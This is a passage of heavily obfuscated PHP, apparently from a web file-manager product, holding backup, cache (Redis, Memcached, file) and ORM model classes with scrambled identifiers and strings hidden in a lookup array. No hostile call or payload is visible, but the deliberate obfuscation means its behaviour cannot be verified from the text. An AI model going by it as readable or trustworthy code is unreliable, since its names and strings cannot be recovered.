$é“Ô¤ÎÌ, $_SERVER[„Ç©ñÎ©][825] => $ù˜öº¥); Backup::set($›•ÆÀØî); $Šï¶‡¹æ = $¶óàŞÖ’ = 0; } } $Ø‰¤Üı¢ = count($ã¤¨ë•); $©Éµ¡¶Š++; } while ($Ø‰¤Üı¢ == $õÒß¨Ë); $Ë¾‡ÕÎ¸->end(); $›•ÆÀØî = array($_SERVER[„Ç©ñÎ©][826] => 1, $_SERVER[„Ç©ñÎ©][506] => time(), $_SERVER[„Ç©ñÎ©][778] => 1, $_SERVER[„Ç©ñÎ©][823] => $Ş³™¢ïª, $_SERVER[„Ç©ñÎ©][815] => $ÍŸáÓ, $_SERVER[„Ç©ñÎ©][814] => $Íøäİ·¥, $_SERVER[„Ç©ñÎ©][827] => time()); if ($¶óàŞÖ’) { $›•ÆÀØî[$_SERVER[„Ç©ñÎ©][824]] = $é“Ô¤ÎÌ; $›•ÆÀØî[$_SERVER[„Ç©ñÎ©][825]] = $ù˜öº¥; } Backup::set($›•ÆÀØî); $this->_fileFilter($ºÅùãåø); return !0; } private function _fileExist($Â·çü£, &$£ÇÏŸ²Ô, $¦Ìè¿òË) { $Şˆ»“ŸŸ =& $_SERVER[„Ç©ñÎ©]; $Ëª¥Ğ¡³ = $Â·çü£[$Şˆ»“ŸŸ[94]]; if (in_array($Â·çü£[$Şˆ»“ŸŸ[477]], $£ÇÏŸ²Ô)) { return !1; } if (!in_array($Â·çü£[$Şˆ»“ŸŸ[820]], $¦Ìè¿òË)) { return !1; } if (IO::exist($Ëª¥Ğ¡³)) { return !0; } $ï¢­¶á¡ = get_path_father($Ëª¥Ğ¡³); if (IO::exist($ï¢­¶á¡)) { $£ÇÏŸ²Ô[] = $Â·çü£[$Şˆ»“ŸŸ[477]]; return !1; } $Ø¥ªİ = array($Şˆ»“ŸŸ[820] => $Â·çü£[$Şˆ»“ŸŸ[820]], $Şˆ»“ŸŸ[94] => array($Şˆ»“ŸŸ[392], "{$ï¢­¶á¡}\x25")); $×ËÛ§¸Š = Model($Şˆ»“ŸŸ[792])->where($Ø¥ªİ)->field($Şˆ»“ŸŸ[478])->select(); $£ÇÏŸ²Ô = array_merge($£ÇÏŸ²Ô, array_to_keyvalue($×ËÛ§¸Š, $Şˆ»“ŸŸ[12], $Şˆ»“ŸŸ[477])); return !1; } private function _fileFilter($ôŸàÙÜş) { $öıß±îè =& $_SERVER[„Ç©ñÎ©]; if (empty($ôŸàÙÜş)) { return; } $¿Ñ÷º õ = array($öıß±îè[477] => array($öıß±îè[7], array_unique($ôŸàÙÜş))); $øÅÁÄ‘ = Model($öıß±îè[828])->where($¿Ñ÷º õ)->field($öıß±îè[411])->select(); foreach ($øÅÁÄ‘ as $ñàôƒóù) { Model($öıß±îè[828])->remove($ñàôƒóù[$öıß±îè[411]], !1); } } private function storeIds() { $ËâíìÈ¶ =& $_SERVER[„Ç©ñÎ©]; $—î×«ı‚ = Model($ËâíìÈ¶[770])->listData(); $ûì—£ = array(); $áÓµ¢· = $GLOBALS[$ËâíìÈ¶[6]][$ËâíìÈ¶[99]][$ËâíìÈ¶[829]]; foreach ($—î×«ı‚ as $ƒŒ¨Şâ) { $­ê”ıÃö = strtolower($ƒŒ¨Şâ[$ËâíìÈ¶[105]]); if (!isset($áÓµ¢·[$­ê”ıÃö])) { continue; } $Æ´ı”ê = $ËâíìÈ¶[84] . (isset($áÓµ¢·[$­ê”ıÃö]) ? $áÓµ¢·[$­ê”ıÃö] : ucfirst($­ê”ıÃö)); if (!class_exists($Æ´ı”ê)) { continue; } $ûì—£[] = $ƒŒ¨Şâ[$ËâíìÈ¶[408]]; } return $ûì—£; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Œ¬ú²Ü• =& $_SERVER[„Ç©ñÎ©]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $õè‡ƒß– = $GLOBALS[$Œ¬ú²Ü•[6]][$Œ¬ú²Ü•[358]]; $şÏÒ¦¢¿ = $õè‡ƒß–[$õè‡ƒß–[$Œ¬ú²Ü•[830]]]; $¦¡ ›ú‹ = $õè‡ƒß–[$Œ¬ú²Ü•[831]]; switch ($õè‡ƒß–[$Œ¬ú²Ü•[830]]) { case $Œ¬ú²Ü•[21]: self::$handle = Model($Œ¬ú²Ü•[832]); break; case $Œ¬ú²Ü•[833]: self::$handle = new CacheRedis($şÏÒ¦¢¿, $¦¡ ›ú‹); break; case $Œ¬ú²Ü•[834]: self::$handle = new CacheMemcached($şÏÒ¦¢¿, $¦¡ ›ú‹); break; case $Œ¬ú²Ü•[209]: self::$handle = new CacheFile($şÏÒ¦¢¿, $¦¡ ›ú‹); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÖÄ†¶¾) { if (is_array($ÖÄ†¶¾) || is_object($ÖÄ†¶¾)) { $ÖÄ†¶¾ = json_encode($ÖÄ†¶¾); } $ÖÄ†¶¾ = rawurlencode($ÖÄ†¶¾); return md5(KOD_SITE_ID . $_SERVER[„Ç©ñÎ©][11] . $ÖÄ†¶¾); } public static function get($¿ƒ¨®©Ï, $Àğºí…É = false) { $üÍ¶Ñ·° = self::key($¿ƒ¨®©Ï); if ($Àğºí…É) { return unserialize(self::init()->get($üÍ¶Ñ·°)); } if (!isset(self::$memoryCache[$üÍ¶Ñ·°])) { $“Ã„äÚ‹ = self::init()->get($üÍ¶Ñ·°); self::$memoryCache[$üÍ¶Ñ·°] = unserialize($“Ã„äÚ‹); } return self::$memoryCache[$üÍ¶Ñ·°]; } public static function set($’ô¾À¿Ï, $¥û‰íØ¹, $È™ã¶ = false) { $éú¶û¼à = self::key($’ô¾À¿Ï); if (isset(self::$memoryCache[$éú¶û¼à]) && self::$memoryCache[$éú¶û¼à] === $¥û‰íØ¹) { return !0; } if ($È™ã¶ === 0) { self::$memoryCache[$éú¶û¼à] = $¥û‰íØ¹; return !0; } CacheLock::lock($’ô¾À¿Ï); $ÉªïÜßè = self::init()->set($éú¶û¼à, serialize($¥û‰íØ¹), $È™ã¶); self::$memoryCache[$éú¶û¼à] = $¥û‰íØ¹; CacheLock::unlock($’ô¾À¿Ï); return $ÉªïÜßè; } public static function getCall($«¯Ÿ¾Óé, $ÏÅ¨Õ ÷, $ĞşçÍßï, $êàÖ‹åÂ = array()) { $Ûò•°ã€ =& $_SERVER[„Ç©ñÎ©]; $Å´÷£Äâ = self::get($«¯Ÿ¾Óé); if ($Å´÷£Äâ || $Å´÷£Äâ === $Ûò•°ã€[12]) { return $Å´÷£Äâ; } $Å´÷£Äâ = call_user_func_array($ĞşçÍßï, $êàÖ‹åÂ); $Å´÷£Äâ = $Å´÷£Äâ ? $Å´÷£Äâ : $Ûò•°ã€[12]; self::set($«¯Ÿ¾Óé, $Å´÷£Äâ, $ÏÅ¨Õ ÷); return $Å´÷£Äâ; } public static function remove($»š³ØÚ) { $ÅÛàúß = self::key($»š³ØÚ); unset(self::$memoryCache[$ÅÛàúß]); self::clearTimeout(); CacheLock::lock($»š³ØÚ); $½°àï• = self::init()->remove($ÅÛàúß); CacheLock::unlock($»š³ØÚ); return $½°àï•; } public static function removeMemory($¦‰ÊÁÄ ) { $µªë±º = self::key($¦‰ÊÁÄ ); unset(self::$memoryCache[$µªë±º]); } public static function clearMemory($¸ÅÅ¢ø˜ = false) { if ($¸ÅÅ¢ø˜) { $¸ÅÅ¢ø˜ = self::key($¸ÅÅ¢ø˜); unset(self::$memoryCache[$¸ÅÅ¢ø˜]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[„Ç©ñÎ©][835])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[„Ç©ñÎ©][836])) { self::init()->clearTimeout(); } } } goto E¬‚ƒ¬ºŠ‹; c—¥¶“ÂæÆ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\x6f\x72\x64\145\162", "\141\154\151\141\163", "\150\x61\x76\151\156\147", "\x67\x72\x6f\x75\160", "\154\x6f\x63\x6b", "\144\x69\x73\x74\x69\156\143\164", "\141\165\164\x6f", "\146\151\154\x74\x65\162", "\x76\141\154\151\x64\141\164\x65", "\162\x65\163\x75\x6c\164", "\142\151\x6e\144", "\164\157\x6b\x65\156"); public function __construct($ˆÈæƒ¼ó = '', $™Ë­ˆï± = '', $èˆÊìÕÒ = '') { $Ùè ÈĞ =& $_SERVER[„Ç©ñÎ©]; $this->_initialize(); if (!empty($ˆÈæƒ¼ó)) { if (strpos($ˆÈæƒ¼ó, $Ùè ÈĞ[10])) { list($this->dbName, $this->name) = explode($Ùè ÈĞ[10], $ˆÈæƒ¼ó); } else { $this->name = $ˆÈæƒ¼ó; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($™Ë­ˆï±)) { $this->tablePrefix = $Ùè ÈĞ[12]; } elseif ($Ùè ÈĞ[12] != $™Ë­ˆï±) { $this->tablePrefix = $™Ë­ˆï±; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ùè ÈĞ[253]); } $this->db(0, empty($this->connection) ? $èˆÊìÕÒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $›æµá‹ =& $_SERVER[„Ç©ñÎ©]; if (empty($this->fields)) { if (think_config($›æµá‹[254])) { $ÁÎ˜å— = $this->dbName ? $this->dbName : think_config($›æµá‹[255]); $ï¥üç¬ = think_var_cache($›æµá‹[256] . strtolower(get_path_this($ÁÎ˜å—) . $›æµá‹[10] . $this->name)); if ($ï¥üç¬) { $ÙúóÒ¹ó = think_config($›æµá‹[257]); if (empty($ÙúóÒ¹ó) || $ï¥üç¬[$›æµá‹[258]] == $ÙúóÒ¹ó) { $this->fields = $ï¥üç¬; return; } } } $this->flush(); } } public function flush() { $²¾…ã­ş =& $_SERVER[„Ç©ñÎ©]; $this->db->setModel($this->name); $àúÏöš½ = $this->db->getFields($this->getTableName()); if (!$àúÏöš½) { return !1; } $this->fields = array_keys($àúÏöš½); $this->fields[$²¾…ã­ş[259]] = !1; foreach ($àúÏöš½ as $‹—˜È– => $Â¹»ûƒ¨) { $’ëã½ìÃ[$‹—˜È–] = $Â¹»ûƒ¨[$²¾…ã­ş[33]]; if ($Â¹»ûƒ¨[$²¾…ã­ş[39]]) { $this->fields[$²¾…ã­ş[260]] = $‹—˜È–; if ($Â¹»ûƒ¨[$²¾…ã­ş[42]]) { $this->fields[$²¾…ã­ş[259]] = !0; } } } $this->fields[$²¾…ã­ş[261]] = $’ëã½ìÃ; if (think_config($²¾…ã­ş[257])) { $this->fields[$²¾…ã­ş[258]] = think_config($²¾…ã­ş[257]); } if (think_config($²¾…ã­ş[254])) { $×…ó¯÷ = $this->dbName ? $this->dbName : think_config($²¾…ã­ş[255]); think_var_cache($²¾…ã­ş[256] . strtolower(get_path_this($×…ó¯÷) . $²¾…ã­ş[10] . $this->name), $this->fields); } } public function switchModel($ÏÛ‘í ‘, $îö¸½™» = array()) { $Œ†÷ÈŠ =& $_SERVER[„Ç©ñÎ©]; $Ôµú¥ò€ = ucwords(strtolower($ÏÛ‘í ‘)) . $Œ†÷ÈŠ[262]; if (!class_exists($Ôµú¥ò€)) { think_exception($Ôµú¥ò€ . think_lang($Œ†÷ÈŠ[263])); } $this->_extModel = new $Ôµú¥ò€($this->name); if (!empty($îö¸½™»)) { foreach ($îö¸½™» as $Á«¸®°×) { $this->_extModel->setProperty($Á«¸®°×, $this->{$Á«¸®°×}); } } return $this->_extModel; } public function __set($©ğãÍ·Ê, $¦¦ò”çö) { $this->data[$©ğãÍ·Ê] = $¦¦ò”çö; } public function __get($å¥Ïæµ•) { return isset($this->data[$å¥Ïæµ•]) ? $this->data[$å¥Ïæµ•] : null; } public function __isset($êëæü¥Ã) { return isset($this->data[$êëæü¥Ã]); } public function __unset($‚¨¯ì³Ù) { unset($this->data[$‚¨¯ì³Ù]); } public function __call($ï—ç¨Æ, $ƒû›²¥ô) { $»·±•… =& $_SERVER[„Ç©ñÎ©]; if (in_array(strtolower($ï—ç¨Æ), $this->methods, !0)) { $this->options[strtolower($ï—ç¨Æ)] = $ƒû›²¥ô[0]; return $this; } elseif (in_array(strtolower($ï—ç¨Æ), array($»·±•…[264], $»·±•…[265], $»·±•…[266], $»·±•…[267], $»·±•…[268]), !0)) { $ŸıŞœï = isset($ƒû›²¥ô[0]) ? $ƒû›²¥ô[0] : $»·±•…[198]; $ŸıŞœï = $this->db->parseKey($ŸıŞœï); return $this->getField(strtoupper($ï—ç¨Æ) . $»·±•…[269] . $ŸıŞœï . $»·±•…[270] . $ï—ç¨Æ, $»·±•…[264]); } elseif (strtolower(substr($ï—ç¨Æ, 0, 5)) == $»·±•…[271]) { $ŸıŞœï = think_parse_name(substr($ï—ç¨Æ, 5)); $¸‚‡•Ã[$ŸıŞœï] = $ƒû›²¥ô[0]; return $this->where($¸‚‡•Ã)->find(); } elseif (strtolower(substr($ï—ç¨Æ, 0, 10)) == $»·±•…[272]) { $”ïÕìÖÏ = think_parse_name(substr($ï—ç¨Æ, 10)); $¸‚‡•Ã[$”ïÕìÖÏ] = $ƒû›²¥ô[0]; return $this->where($¸‚‡•Ã)->getField($ƒû›²¥ô[1]); } elseif (isset($this->_scope[$ï—ç¨Æ])) { return $this->scope($ï—ç¨Æ, $ƒû›²¥ô[0]); } elseif (method_exists($this, $ï—ç¨Æ)) { array_unshift($ƒû›²¥ô, $ï—ç¨Æ); return call_user_func_array(array($this, $»·±•…[273]), $ƒû›²¥ô); } else { return call_user_func_array(array(parent, $ï—ç¨Æ), $ƒû›²¥ô); } } protected function call() { $í™¼ˆÊ® =& $_SERVER[„Ç©ñÎ©]; $ŞÓ½²Ï… = func_get_args(); $âËè¹Á£ = array_shift($ŞÓ½²Ï…); $ôêåñ³Ç = $âËè¹Á£; if (is_array($âËè¹Á£)) { $ôêåñ³Ç = $âËè¹Á£[1]; $âËè¹Á£ = $âËè¹Á£[0]; } $ÁØ˜Ï´‰ = count($ŞÓ½²Ï…) - 1; if (isset($ŞÓ½²Ï…[$ÁØ˜Ï´‰]) && $ŞÓ½²Ï…[$ÁØ˜Ï´‰] === $âËè¹Á£) { think_exception(__CLASS__ . $í™¼ˆÊ®[4] . $âËè¹Á£ . think_lang($í™¼ˆÊ®[274])); return; } $ŞÓ½²Ï…[] = $âËè¹Á£; if (method_exists($this, $í™¼ˆÊ®[275])) { $ºÓÖª™± = call_user_func_array(array($this, $í™¼ˆÊ®[276]), array($ôêåñ³Ç, $ŞÓ½²Ï…)); if (!is_null($ºÓÖª™±) && $ºÓÖª™± !== !1) { return $ºÓÖª™±; } } $ôŸãÂ÷¨ = call_user_func_array(array($this, $âËè¹Á£), $ŞÓ½²Ï…); if (method_exists($this, $í™¼ˆÊ®[277])) { $ºÓÖª™± = call_user_func_array(array($this, $í™¼ˆÊ®[278]), array($ôêåñ³Ç, $ŞÓ½²Ï…, $ôŸãÂ÷¨)); if ($ºÓÖª™±) { return $ºÓÖª™±; } } return $ôŸãÂ÷¨; } protected function _initialize() { } protected function _facade($¯Š®ğÀ”) { $òíâÔäî =& $_SERVER[„Ç©ñÎ©]; if (!empty($this->fields)) { foreach ($¯Š®ğÀ” as $§ÌÉÁö => $œ¼›Ôáº) { if (is_array($this->fields) && !in_array($§ÌÉÁö, $this->fields, !0)) { unset($¯Š®ğÀ”[$§ÌÉÁö]); } elseif (is_scalar($œ¼›Ôáº)) { $this->_parseType($¯Š®ğÀ”, $§ÌÉÁö); } } } if (!empty($this->options[$òíâÔäî[279]])) { $¯Š®ğÀ” = array_map($this->options[$òíâÔäî[279]], $¯Š®ğÀ”); unset($this->options[$òíâÔäî[279]]); } $this->_beforeWrite($¯Š®ğÀ”); return $¯Š®ğÀ”; } protected function _beforeWrite(&$ø©¯—¡Ò) { } public function add($€¶»ÏÑ  = '', $ë×½—ïê = array(), $ó’åâĞ = false) { if (empty($€¶»ÏÑ )) { if (!empty($this->data)) { $€¶»ÏÑ  = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[„Ç©ñÎ©][280]); return !1; } } $ë×½—ïê = $this->_parseOptions($ë×½—ïê); $€¶»ÏÑ  = $this->_facade($€¶»ÏÑ ); if (!1 === $this->_beforeInsert($€¶»ÏÑ , $ë×½—ïê)) { return !1; } $íø…»ÛŠ = $this->db->insert($€¶»ÏÑ , $ë×½—ïê, $ó’åâĞ); if (!1 !== $íø…»ÛŠ) { $—™¹¨ª– = $this->getLastInsID(); if ($—™¹¨ª–) { $€¶»ÏÑ [$this->getPk()] = $—™¹¨ª–; $this->_after_insert($€¶»ÏÑ , $ë×½—ïê); return $—™¹¨ª–; } $this->_after_insert($€¶»ÏÑ , $ë×½—ïê); } return $íø…»ÛŠ; } protected function _beforeInsert(&$İ‹Âò…, $ˆÂ‚áĞ) { } protected function _after_insert($¯Œ‘¨Ú¥, $ÄëŠåµµ) { } public function addAll($¦…—Óˆ…, $„®±ş¶Ù = array(), $…óÁ–Ú„ = false) { $Ÿåã =& $_SERVER[„Ç©ñÎ©]; if (empty($¦…—Óˆ…)) { $this->error = think_lang($Ÿåã[280]); return !1; } $„®±ş¶Ù = $this->_parseOptions($„®±ş¶Ù); foreach ($¦…—Óˆ… as $©™€ªŞ» => $õÚì¥İ“) { $¦…—Óˆ…[$©™€ªŞ»] = $this->_facade($õÚì¥İ“); } if (method_exists($this->db, $Ÿåã[281])) { $à˜¨–ôÜ = $this->db->insertAll($¦…—Óˆ…, $„®±ş¶Ù, $…óÁ–Ú„); } else { $this->startTrans(); foreach ($¦…—Óˆ… as $©™€ªŞ» => $õÚì¥İ“) { $à˜¨–ôÜ = $this->db->insert($õÚì¥İ“, $„®±ş¶Ù, $…óÁ–Ú„); } $this->commit(); } if (!1 !== $à˜¨–ôÜ) { $şúš›¨È = $this->getLastInsID(); if ($şúš›¨È) { return $şúš›¨È; } } return $à˜¨–ôÜ; } public function selectAdd($«İ‚„íÈ = '', $ùüÑ‹¥é = '', $ŸÔ™ÖæÕ = array()) { $“­½ŠÃš =& $_SERVER[„Ç©ñÎ©]; $ŸÔ™ÖæÕ = $this->_parseOptions($ŸÔ™ÖæÕ); if (!1 === ($¨À›ÌŞ• = $this->db->selectInsert($«İ‚„íÈ ? $«İ‚„íÈ : $ŸÔ™ÖæÕ[$“­½ŠÃš[282]], $ùüÑ‹¥é ? $ùüÑ‹¥é : $this->getTableName(), $ŸÔ™ÖæÕ))) { $this->error = think_lang($“­½ŠÃš[283]); return !1; } else { return $¨À›ÌŞ•; } } public function save($çª¹¿ƒÅ = '', $©ö–í™— = array()) { $¯…éõÁŒ =& $_SERVER[„Ç©ñÎ©]; if (empty($çª¹¿ƒÅ)) { if (!empty($this->data)) { $çª¹¿ƒÅ = $this->data; $this->data = array(); } else { $this->error = think_lang($¯…éõÁŒ[280]); return !1; } } $çª¹¿ƒÅ = $this->_facade($çª¹¿ƒÅ); $©ö–í™— = $this->_parseOptions($©ö–í™—); $„ğ©íè“ = $this->getPk(); if (!isset($©ö–í™—[$¯…éõÁŒ[284]])) { if (isset($çª¹¿ƒÅ[$„ğ©íè“])) { $÷Ü¨áøƒ[$„ğ©íè“] = $çª¹¿ƒÅ[$„ğ©íè“]; $©ö–í™—[$¯…éõÁŒ[284]] = $÷Ü¨áøƒ; unset($çª¹¿ƒÅ[$„ğ©íè“]); } else { $this->error = think_lang($¯…éõÁŒ[283]); return !1; } } if (is_array($©ö–í™—[$¯…éõÁŒ[284]]) && isset($©ö–í™—[$¯…éõÁŒ[284]][$„ğ©íè“])) { $©­š¸¼ = $©ö–í™—[$¯…éõÁŒ[284]][$„ğ©íè“]; } if (!1 === $this->_beforeUpdate($çª¹¿ƒÅ, $©ö–í™—)) { return !1; } $»Øè‘Ì = $this->db->update($çª¹¿ƒÅ, $©ö–í™—); if (!1 !== $»Øè‘Ì) { if (isset($©­š¸¼)) { $çª¹¿ƒÅ[$„ğ©íè“] = $©­š¸¼; } $this->_afterUpdate($çª¹¿ƒÅ, $©ö–í™—); } return $»Øè‘Ì; } protected function _beforeUpdate(&$ÇœÒ³“¸, $¼Çä¤â±) { } protected function _afterUpdate($§ñìŒ–Ã, $’´ıîô) { } public function delete($¹àÚ‘Ûß = array()) { $¦èùëû› =& $_SERVER[„Ç©ñÎ©]; if (empty($¹àÚ‘Ûß) && empty($this->options[$¦èùëû›[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $œ¼ôÊ½ = $this->getPk(); if (is_numeric($¹àÚ‘Ûß) || is_string($¹àÚ‘Ûß)) { if (strpos($¹àÚ‘Ûß, $¦èùëû›[50])) { $ĞÉ›À[$œ¼ôÊ½] = array($¦èùëû›[285], $¹àÚ‘Ûß); } else { $ĞÉ›À[$œ¼ôÊ½] = $¹àÚ‘Ûß; } $this->options[$¦èùëû›[284]] = $ĞÉ›À; } $¹àÚ‘Ûß = $this->_parseOptions(); if (is_array($¹àÚ‘Ûß[$¦èùëû›[284]]) && isset($¹àÚ‘Ûß[$¦èùëû›[284]][$œ¼ôÊ½])) { $ˆ‰‘Î³ = $¹àÚ‘Ûß[$¦èùëû›[284]][$œ¼ôÊ½]; } $¶¯¶±Úô = $this->db->delete($¹àÚ‘Ûß); if (!1 !== $¶¯¶±Úô) { $¿‚„Å = array(); if (isset($ˆ‰‘Î³)) { $¿‚„Å[$œ¼ôÊ½] = $ˆ‰‘Î³; } $this->_after_delete($¿‚„Å, $¹àÚ‘Ûß); } return $¶¯¶±Úô; } protected function _after_delete($ŸæÓ­ºÑ, $–œï»È) { } public function select($¢ñ¥„ê© = array()) { $÷‹›˜­ =& $_SERVER[„Ç©ñÎ©]; if (is_string($¢ñ¥„ê©) || is_numeric($¢ñ¥„ê©)) { $¥×¯¹Š° = $this->getPk(); if (strpos($¢ñ¥„ê©, $÷‹›˜­[50])) { $áÏâíû™[$¥×¯¹Š°] = array($÷‹›˜­[285], $¢ñ¥„ê©); } else { $áÏâíû™[$¥×¯¹Š°] = $¢ñ¥„ê©; } $this->options[$÷‹›˜­[284]] = $áÏâíû™; } elseif (!1 === $¢ñ¥„ê©) { $¢ñ¥„ê© = $this->_parseOptions(); return $÷‹›˜­[286] . $this->db->buildSelectSql($¢ñ¥„ê©) . $÷‹›˜­[287]; } $¢ñ¥„ê© = $this->_parseOptions(); $³çÛù°ã = $this->db->select($¢ñ¥„ê©); if (!1 === $³çÛù°ã) { return !1; } if (empty($³çÛù°ã)) { return null; } $this->_afterSelect($³çÛù°ã, $¢ñ¥„ê©); return $³çÛù°ã; } protected function _afterSelect(&$êÛºÃí™, $Ã×–ßª) { } public function buildSql($Â³´ë¿ï = array()) { $Ôúôñ©ß =& $_SERVER[„Ç©ñÎ©]; $Â³´ë¿ï = $this->_parseOptions($Â³´ë¿ï); return $Ôúôñ©ß[286] . $this->db->buildSelectSql($Â³´ë¿ï) . $Ôúôñ©ß[287]; } public function optionsValue($ğôˆú¼Ê = null) { if (is_null($ğôˆú¼Ê)) { return $this->options; } elseif (is_array($ğôˆú¼Ê)) { $this->options = array_merge($this->options, $ğôˆú¼Ê); } } protected function _parseOptions($ÀûÇßµ = array()) { $åÏ“…ş¼ =& $_SERVER[„Ç©ñÎ©]; if (is_array($ÀûÇßµ)) { $ÀûÇßµ = array_merge($this->options, $ÀûÇßµ); } $this->options = array(); if (!isset($ÀûÇßµ[$åÏ“…ş¼[288]])) { $ÀûÇßµ[$åÏ“…ş¼[288]] = $this->getTableName(); $‚¹½¬ÂÔ = $this->fields; } else { $‚¹½¬ÂÔ = $this->getDbFields(); } if (!empty($ÀûÇßµ[$åÏ“…ş¼[289]])) { $ÀûÇßµ[$åÏ“…ş¼[288]] .= $åÏ“…ş¼[53] . $ÀûÇßµ[$åÏ“…ş¼[289]]; } $ÀûÇßµ[$åÏ“…ş¼[290]] = $this->name; if (isset($ÀûÇßµ[$åÏ“…ş¼[284]]) && is_array($ÀûÇßµ[$åÏ“…ş¼[284]]) && !empty($‚¹½¬ÂÔ) && !isset($ÀûÇßµ[$åÏ“…ş¼[291]]) && !isset($ÀûÇßµ[$åÏ“…ş¼[288]])) { foreach ($ÀûÇßµ[$åÏ“…ş¼[284]] as $ëš§İ => $²–åŸÍŞ) { $ëš§İ = trim($ëš§İ); if (in_array($ëš§İ, $‚¹½¬ÂÔ, !0)) { if (is_scalar($²–åŸÍŞ)) { $this->_parseType($ÀûÇßµ[$åÏ“…ş¼[284]], $ëš§İ); } } elseif (!is_numeric($ëš§İ) && $åÏ“…ş¼[11] != substr($ëš§İ, 0, 1) && !1 === strpos($ëš§İ, $åÏ“…ş¼[10]) && !1 === strpos($ëš§İ, $åÏ“…ş¼[269]) && !1 === strpos($ëš§İ, $åÏ“…ş¼[292]) && !1 === strpos($ëš§İ, $åÏ“…ş¼[293])) { unset($ÀûÇßµ[$åÏ“…ş¼[284]][$ëš§İ]); } } } $this->_options_filter($ÀûÇßµ); return $ÀûÇßµ; } protected function _options_filter(&$¤’ŞÈğ) { } protected function _parseType(&$·¼ã“üĞ, $ç¯¬Â¹) { $ó­¡ “­ =& $_SERVER[„Ç©ñÎ©]; if (empty($this->options[$ó­¡ “­[294]][$ó­¡ “­[4] . $ç¯¬Â¹])) { $‚ë¥·¹Ğ = strtolower($this->fields[$ó­¡ “­[261]][$ç¯¬Â¹]); if (!1 !== strpos($‚ë¥·¹Ğ, $ó­¡ “­[295])) { } elseif (!1 === strpos($‚ë¥·¹Ğ, $ó­¡ “­[296]) && !1 !== strpos($‚ë¥·¹Ğ, $ó­¡ “­[297])) { $·¼ã“üĞ[$ç¯¬Â¹] = intval($·¼ã“üĞ[$ç¯¬Â¹]); } elseif (!1 !== strpos($‚ë¥·¹Ğ, $ó­¡ “­[298]) || !1 !== strpos($‚ë¥·¹Ğ, $ó­¡ “­[299])) { $·¼ã“üĞ[$ç¯¬Â¹] = floatval($·¼ã“üĞ[$ç¯¬Â¹]); } elseif (!1 !== strpos($‚ë¥·¹Ğ, $ó­¡ “­[300])) { $·¼ã“üĞ[$ç¯¬Â¹] = (bool) $·¼ã“üĞ[$ç¯¬Â¹]; } } } public function find($¼‰ûüöÙ = array()) { $Ù§Ï×½Ã =& $_SERVER[„Ç©ñÎ©]; if (is_numeric($¼‰ûüöÙ) || is_string($¼‰ûüöÙ)) { $óÊ±Çı[$this->getPk()] = intval($¼‰ûüöÙ); $this->options[$Ù§Ï×½Ã[284]] = $óÊ±Çı; } $this->options[$Ù§Ï×½Ã[301]] = 1; $¼‰ûüöÙ = $this->_parseOptions(); $¥üÈÜÁ = $this->db->select($¼‰ûüöÙ); if (!1 === $¥üÈÜÁ) { return !1; } if (empty($¥üÈÜÁ)) { return null; } $this->data = $¥üÈÜÁ[0]; $this->_afterFind($this->data, $¼‰ûüöÙ); if (!empty($this->options[$Ù§Ï×½Ã[302]])) { return $this->returnResult($this->data, $this->options[$Ù§Ï×½Ã[302]]); } return $this->data; } protected function _afterFind(&$í©àôÂƒ, $Éš£Š†˜) { } protected function returnResult($ğâª¹¨Ê, $³Äîà = '') { $¶œ…é“ =& $_SERVER[„Ç©ñÎ©]; if ($³Äîà) { if (is_callable($³Äîà)) { return call_user_func($³Äîà, $ğâª¹¨Ê); } switch (strtolower($³Äîà)) { case $¶œ…é“[303]: return json_encode($ğâª¹¨Ê); case $¶œ…é“[304]: return xml_encode($ğâª¹¨Ê); } } return $ğâª¹¨Ê; } public function parseFieldsMap($©ÚùïäÉ, $Ò¬çı´Ù = 1) { if (!empty($this->_map)) { foreach ($this->_map as $øƒ¼¼ìŞ => $†Ø‚ †ı) { if ($Ò¬çı´Ù == 1) { if (isset($©ÚùïäÉ[$†Ø‚ †ı])) { $©ÚùïäÉ[$øƒ¼¼ìŞ] = $©ÚùïäÉ[$†Ø‚ †ı]; unset($©ÚùïäÉ[$†Ø‚ †ı]); } } else { if (isset($©ÚùïäÉ[$øƒ¼¼ìŞ])) { $©ÚùïäÉ[$†Ø‚ †ı] = $©ÚùïäÉ[$øƒ¼¼ìŞ]; unset($©ÚùïäÉ[$øƒ¼¼ìŞ]); } } } } return $©ÚùïäÉ; } public function setField($ã­…Ø”Ë, $ß ±íø’ = '') { if (is_array($ã­…Ø”Ë)) { $Ó„İÙƒÃ = $ã­…Ø”Ë; } else { $Ó„İÙƒÃ[$ã­…Ø”Ë] = $ß ±íø’; } return $this->save($Ó„İÙƒÃ); } public function setAdd($ÒŞ·ßîÛ, $àâ÷ƒºà = 1) { $¸Àı‡È‹ =& $_SERVER[„Ç©ñÎ©]; $Óöö‹à¹ = $ÒŞ·ßîÛ . $¸Àı‡È‹[305] . $àâ÷ƒºà; if ($àâ÷ƒºà < 0) { $Óöö‹à¹ = $ÒŞ·ßîÛ . $àâ÷ƒºà; } return $this->setField($ÒŞ·ßîÛ, array($¸Àı‡È‹[306], $Óöö‹à¹)); } public function getField($¹ÂØÏ„, $½ëçÔåş = null) { $î¬¡¡Àí =& $_SERVER[„Ç©ñÎ©]; $©Á²àõ¡[$î¬¡¡Àí[282]] = $¹ÂØÏ„; $©Á²àõ¡ = $this->_parseOptions($©Á²àõ¡); $¹ÂØÏ„ = trim($¹ÂØÏ„); if (strpos($¹ÂØÏ„, 